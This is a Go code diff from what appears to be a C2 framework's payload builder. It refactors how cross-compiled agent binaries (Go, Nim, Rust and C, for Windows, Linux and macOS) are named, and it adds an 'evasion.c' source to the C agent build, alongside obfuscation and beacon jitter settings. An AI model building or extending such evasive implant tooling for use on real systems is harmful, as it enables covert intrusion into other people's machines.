@@ -124,6 +124,21 @@ func resolveOutName(cfg BuildConfig, defaultName string) string {
 	return defaultName
 }
 
+// agentName returns a canonical payload filename: agent_{transport}_{lang}{suffix}.
+// suffix is ".exe", ".dll", ".bin", "_linux", "_darwin", etc.
+// Respects cfg.OutputName override via resolveOutName.
+func agentName(cfg BuildConfig, suffix string) string {
+	transport := cfg.Transport
+	if transport == "" {
+		transport = "http"
+	}
+	lang := cfg.Lang
+	if lang == "" {
+		lang = "go"
+	}
+	return resolveOutName(cfg, fmt.Sprintf("agent_%s_%s%s", transport, lang, suffix))
+}
+
 // BuildEXE cross-compiles the agent for Windows.
 func BuildEXE(cfg BuildConfig, outDir string) (string, error) {
 	gobin, err := findGoOrGarble(cfg.Garble)
@@ -136,7 +151,7 @@ func BuildEXE(cfg BuildConfig, outDir string) (string, error) {
 		return "", fmt.Errorf("crear directorio: %w", err)
 	}
 	arch := normalizeArch(cfg.Arch)
-	outPath := filepath.Join(outDir, resolveOutName(cfg, fmt.Sprintf("agent_%s.exe", arch)))
+	outPath := filepath.Join(outDir, agentName(cfg, ".exe"))
 	pkgPath := filepath.Join(root, "agents", "agent-go", "cmd")
 
 	cmd := buildCmd(gobin, cfg.Garble,
@@ -167,7 +182,7 @@ func BuildEXEStream(cfg BuildConfig, outDir string, progress io.Writer) (string,
 		return "", fmt.Errorf("crear directorio: %w", err)
 	}
 	arch := normalizeArch(cfg.Arch)
-	outPath := filepath.Join(outDir, resolveOutName(cfg, fmt.Sprintf("agent_%s.exe", arch)))
+	outPath := filepath.Join(outDir, agentName(cfg, ".exe"))
 	pkgPath := filepath.Join(root, "agents", "agent-go", "cmd")
 
 	cmd := buildCmd(gobin, cfg.Garble,
@@ -249,7 +264,7 @@ func BuildNimEXE(cfg BuildConfig, outDir string) (string, error) {
 		nimCC  = "i686-w64-mingw32-gcc"
 	}
 
-	outName  := resolveOutName(cfg, fmt.Sprintf("agent_nim_%s.%s", arch, ext))
+	outName  := agentName(cfg, "."+ext)
 	outPath  := filepath.Join(outDir, outName)
 	sleepSec := cfg.SleepSec
 	if sleepSec <= 0 { sleepSec = 5 }
@@ -359,7 +374,7 @@ func BuildDLL(cfg BuildConfig, outDir string) (string, error) {
 	outDir = absDir(root, outDir)
 	os.MkdirAll(outDir, 0755)
 
-	outPath := filepath.Join(outDir, resolveOutName(cfg, fmt.Sprintf("agent_%s.dll", arch)))
+	outPath := filepath.Join(outDir, agentName(cfg, ".dll"))
 	pkgPath := filepath.Join(root, "agents", "agent-go", "dll")
 
 	cmd := exec.Command(gobin, "build",
@@ -386,7 +401,7 @@ func BuildLinux(cfg BuildConfig, outDir string) (string, error) {
 	outDir = absDir(root, outDir)
 	os.MkdirAll(outDir, 0755)
 
-	outPath := filepath.Join(outDir, resolveOutName(cfg, fmt.Sprintf("agent_linux_%s", arch)))
+	outPath := filepath.Join(outDir, agentName(cfg, "_linux"))
 	pkgPath := filepath.Join(root, "agents", "agent-go", "cmd")
 
 	cmd := buildCmd(gobin, cfg.Garble,
@@ -409,7 +424,7 @@ func BuildDarwin(cfg BuildConfig, outDir string) (string, error) {
 	outDir = absDir(root, outDir)
 	os.MkdirAll(outDir, 0755)
 
-	outPath := filepath.Join(outDir, resolveOutName(cfg, fmt.Sprintf("agent_darwin_%s", arch)))
+	outPath := filepath.Join(outDir, agentName(cfg, "_darwin"))
 	pkgPath := filepath.Join(root, "agents", "agent-go", "cmd")
 
 	cmd := buildCmd(gobin, cfg.Garble,
@@ -450,7 +465,7 @@ func BuildRustEXE(cfg BuildConfig, outDir string) (string, error) {
 	jitter := cfg.JitterPct
 	if jitter < 0 { jitter = 20 }
 
-	outName := resolveOutName(cfg, "agent_rust_amd64.exe")
+	outName := agentName(cfg, ".exe")
 	outPath := filepath.Join(outDir, outName)
 
 	rustEnv := append(os.Environ(),
@@ -523,7 +538,7 @@ func BuildCAgentEXE(cfg BuildConfig, outDir string) (string, error) {
 	jitter := cfg.JitterPct
 	if jitter < 0 { jitter = 20 }
 
-	outName := resolveOutName(cfg, "agent_c_amd64.exe")
+	outName := agentName(cfg, ".exe")
 	outPath := filepath.Join(outDir, outName)
 
 	ua := cfg.UserAgent
@@ -533,6 +548,7 @@ func BuildCAgentEXE(cfg BuildConfig, outDir string) (string, error) {
 
 	sources := []string{
 		filepath.Join(agentDir, "agent.c"),
+		filepath.Join(agentDir, "evasion.c"),
 		filepath.Join(agentDir, "transport.c"),
 		filepath.Join(agentDir, "commands.c"),
 		filepath.Join(agentDir, "crypto.c"),
